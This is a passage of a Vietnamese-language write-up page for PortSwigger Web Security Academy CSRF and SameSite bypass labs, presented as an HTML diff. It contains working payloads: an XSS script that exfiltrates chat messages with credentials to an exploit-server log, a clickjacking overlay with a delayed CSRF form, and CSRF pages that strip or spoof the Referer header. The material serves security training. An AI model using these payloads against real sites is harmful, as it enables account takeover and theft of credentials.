+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">location</span><span class="o">=</span><span class="err">&quot;</span><span class="nx">https</span><span class="o">:</span><span class="c1">//cms-&lt;url-lab&gt;/login?username=%3Cscript%3E%20%20%20%20%20%20var%20ws%20%3d%20new%20WebSocket(%27wss%3a%2f%2f0a9600c003aaedc980a067e9005000b0.web-security-academy.net%2fchat%27)%3b%20%20%20%20%20%20%20%20%20%20ws.onopen%20%3d%20function()%20%7b%20%20%20%20%20%20%20%20%20ws.send(%22READY%22)%3b%20%20%20%20%20%7d%3b%20%20%20%20%20%20%20%20%20%20ws.onmessage%20%3d%20function(event)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20fetch(%27https%3a%2f%2fexploit-0a9b004b03f5ed2d80f066b7019800d4.exploit-server.net%2flog%3fres%3d%27%2bbtoa(event.data))%3b%20%20%20%20%20%7d%3b%20%3C%2fscript%3E&amp;password=a\&quot;;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Deliver cho victim. Kiểm tra access log nhận thấy có credential victim gửi về</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2042.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện decode base64</p>
+<p><img alt="image.png" src="image%2043.png" /></p>
+</li>
+<li>
+<p>Lấy credential và login thành công. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2044.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-samesite-lax-bypass-via-cookie-refresh"><strong>Lab: SameSite Lax bypass via cookie refresh</strong><a class="headerlink" href="#lab-samesite-lax-bypass-via-cookie-refresh" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh">Lab: SameSite Lax bypass via cookie refresh | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào tài khoản <code>wiener:peter</code> . Thực hiện thử nghiệm csrf attack bằng exploit server. Quan sát rằng khi thực hiện trong 2 phút kể từ khi login thì hoàn toàn có thể lấy được cookie là do cơ chế oauth trong 2 phút đầu sẽ để same-site strict. Ngoài ra, nếu như muốn lấy lại cookie mới ⇒ gọi tới API <code>GET /social-login</code> ⇒ lại có lại 2 phút kia. Như vậy, nếu khiến cho victim vào trang <code>GET /social-login</code> rồi sau đó dùng csrf attack ⇒ change email thành công</li>
+<li>
+<p>Trước hết, phải khiến victim vào trang <code>GET /social-login</code> để lấy cookie mới. Tại exploit server, chúng ta tạo trang như sau để thực hiện 1 clickjacking attack</p>
+<ul>
+<li>
+<p>Exploitserver</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span>&lt;div<span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;text-align: center; margin-top: 20vh; font-family: Arial, sans-serif;&quot;</span>&gt;
+<span class="w">  </span>Click<span class="w"> </span>anywhere<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>page
+&lt;/div&gt;
+&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://0a3500f603710e1f80b31277009600bc.web-security-academy.net/social-login&quot;</span><span class="w"> </span>
+<span class="w">   </span><span class="nv">target</span><span class="o">=</span><span class="s2">&quot;_blank&quot;</span><span class="w"> </span>
+<span class="nv">style</span><span class="o">=</span><span class="s2">&quot;display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: default;&quot;</span>
+<span class="w">   </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;&quot;</span>&gt;
+<span class="w">    </span>Click<span class="w"> </span>me!!!
+&lt;/a&gt;
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, ngay sau khi khiến victim lấy cookie mới cũng như là sẽ có samesite lax thì chúng ta sẽ thực hiện luôn csrf attack bằng cách thêm một function khi user click nhưng có timeout đủ chờ victim lấy được cookie mới và rơi vào trạng thái samesite lax. Toàn bộ phần body của exploit server như sau:</p>
+<ul>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code>&lt;form<span class="w"> </span><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="w"> </span><span class="nv">action</span><span class="o">=</span><span class="s2">&quot;https://0a3500f603710e1f80b31277009600bc.web-security-academy.net/my-account/change-email&quot;</span>&gt;
+<span class="w">    </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;email&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;a1@hacker.com&quot;</span>&gt;
+&lt;/form&gt;
+&lt;div<span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;text-align: center; margin-top: 20vh; font-family: Arial, sans-serif;&quot;</span>&gt;
+<span class="w">  </span>Click<span class="w"> </span>anywhere<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>page
+&lt;/div&gt;
+&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://0a3500f603710e1f80b31277009600bc.web-security-academy.net/social-login&quot;</span><span class="w"> </span>
+<span class="w">   </span><span class="nv">target</span><span class="o">=</span><span class="s2">&quot;_blank&quot;</span><span class="w"> </span>
+<span class="nv">style</span><span class="o">=</span><span class="s2">&quot;display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: default;&quot;</span>
+<span class="w">   </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;setTimeout(function(){ document.forms[0].submit(); }, 6000);&quot;</span>&gt;
+<span class="w">    </span>Click<span class="w"> </span>me!!!
+&lt;/a&gt;
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện deliver to victim. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2045.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-csrf-where-referer-validation-depends-on-header-being-present"><strong>Lab: CSRF where Referer validation depends on header being present</strong><a class="headerlink" href="#lab-csrf-where-referer-validation-depends-on-header-being-present" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present">Lab: CSRF where Referer validation depends on header being present | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> . Thực hiện change email và quan sát thấy chức năng này không kèm theo bất kỳ biện pháp bảo vệ chống csrf attack</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2046.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, khi thử nghiệm với exploit server thì chúng ta thấy được có cơ chế chống lại csrf attack bằng cách kiểm tra referer header - header này chúng ta có thể kiểm soát</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2047.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Bằng cách thêm thẻ meta chúng ta có thể lược bỏ header này, và vì cơ chế kiểm tra lỏng lẻo khi thiếu header này, csrf attack xảy ra</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code>&lt;html&gt;
+&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;referrer&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;never&quot;</span>&gt;
+<span class="w">  </span>&lt;!--<span class="w"> </span>CSRF<span class="w"> </span>PoC<span class="w"> </span>-<span class="w"> </span>generated<span class="w"> </span>by<span class="w"> </span>Burp<span class="w"> </span>Suite<span class="w"> </span>Professional<span class="w"> </span>--&gt;
+<span class="w">  </span>&lt;body&gt;
+<span class="w">    </span>&lt;form<span class="w"> </span><span class="nv">action</span><span class="o">=</span><span class="s2">&quot;https://0a0a00eb04e650c68029e98800ac005b.web-security-academy.net/my-account/change-email&quot;</span><span class="w"> </span><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span>&gt;
+<span class="w">      </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;email&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;a1&amp;#64;a&amp;#46;com&quot;</span><span class="w"> </span>/&gt;
+<span class="w">      </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Submit request&quot;</span><span class="w"> </span>/&gt;
+<span class="w">    </span>&lt;/form&gt;
+<span class="w">    </span>&lt;script&gt;
+<span class="w">      </span>history.pushState<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">      </span>document.forms<span class="o">[</span><span class="m">0</span><span class="o">]</span>.submit<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span>&lt;/script&gt;
+<span class="w">  </span>&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện deliver to victim và hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2048.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-csrf-with-broken-referer-validation"><strong>Lab: CSRF with broken Referer validation</strong><a class="headerlink" href="#lab-csrf-with-broken-referer-validation" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken">Lab: CSRF with broken Referer validation | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login với tài khoản <code>wiener:peter</code>. Điều hướng đến chức năng <code>My account &gt; Update email</code></p>
+<p><img alt="image.png" src="image%2049.png" /></p>
+</li>
+<li>
+<p>Tại đây, quan sát rằng khi thực hiện update email, server kiểm tra header <code>Referer</code></p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2050.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, chúng ta có thể thực hiện thêm header như sau. Lưu ý vì chúng ta gửi request từ exploit server cho victim nên header <code>Referer</code> chứa domain của exploit server. Tuy nhiên, server lại chỉ kiểm tra xem header có chứa domain hợp lệ không ⇒ có thể dùng <code>?&lt;valid domain name&gt;</code> . Ngoài ra, với trình duyệt thường sẽ bỏ qua phần đằng sau <code>?</code> nên cần bổ sung header <code>Referrer-Policy: unsafe-url</code></p>
+</li>
+<li>
+<p>Chúng ta sẽ tạo payload như sau:</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://&lt;url-lab&gt;/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;11111&amp;#64;a&amp;#46;com&quot;</span> <span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/exploit?a=https://&lt;url-lab&gt;/my-account&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi cho victim. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2051.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>1 cách giải khác đó là thay vì dùng header <code>Referrer-Policy: unsafe-url</code> chúng ta có thể đẩy <code>meta</code> trong body</p>
+<ul>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;referrer&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;unsafe-url&quot;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://&lt;url-lab&gt;/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;11111&amp;#64;a&amp;#46;com&quot;</span> <span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/exploit?a=https://&lt;url-lab&gt;/my-account&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
